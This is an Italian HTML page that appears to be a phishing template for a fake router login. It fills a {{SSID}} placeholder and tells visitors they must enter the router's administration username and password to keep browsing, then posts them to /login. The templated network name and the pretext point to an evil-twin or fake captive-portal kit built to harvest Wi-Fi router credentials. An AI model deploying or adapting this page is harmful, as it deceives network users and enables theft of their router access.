<!doctype html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accesso router</title>
<style>
*{box-sizing:border-box;font-family:Segoe UI,Roboto,Arial,sans-serif}
body{margin:0;background:#eef1f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.box{background:#fff;width:380px;max-width:94vw;border:1px solid #d8dee6;border-radius:10px;overflow:hidden;
box-shadow:0 8px 28px rgba(20,30,60,.12)}
.hd{background:#c8102e;color:#fff;padding:18px 22px;font-size:17px;font-weight:600}
.bd{padding:24px 22px}
.warn{background:#fff8e1;border:1px solid #ffe082;color:#7a5b00;font-size:13px;padding:11px 13px;
border-radius:7px;margin-bottom:20px;line-height:1.45}
label{display:block;font-size:13px;color:#445;margin:13px 0 5px;font-weight:600}
input{width:100%;padding:12px;border:1px solid #c5cdd6;border-radius:7px;font-size:14px}
input:focus{outline:none;border-color:#c8102e}
button{width:100%;margin-top:22px;padding:13px;border:0;border-radius:7px;background:#c8102e;
color:#fff;font-size:15px;font-weight:600;cursor:pointer}
.ft{padding:13px 22px;background:#f6f8fa;color:#8a94a3;font-size:11px;border-top:1px solid #e3e8ee}
</style></head><body>
<form class="box" method="POST" action="/login">
<div class="hd">Accesso richiesto</div>
<div class="bd">
<div class="warn">Per continuare a navigare &egrave; necessario verificare l'accesso al gateway <b>{{SSID}}</b>. Inserisci le credenziali di amministrazione del router.</div>
<label>Nome utente</label>
<input name="username" type="text" value="admin" autocomplete="username">
<label>Password</label>
<input name="password" type="password" required>
<button type="submit">Accedi</button>
</div>
<div class="ft">Pannello di configurazione &middot; firmware 2.1.7</div>
</form></body></html>
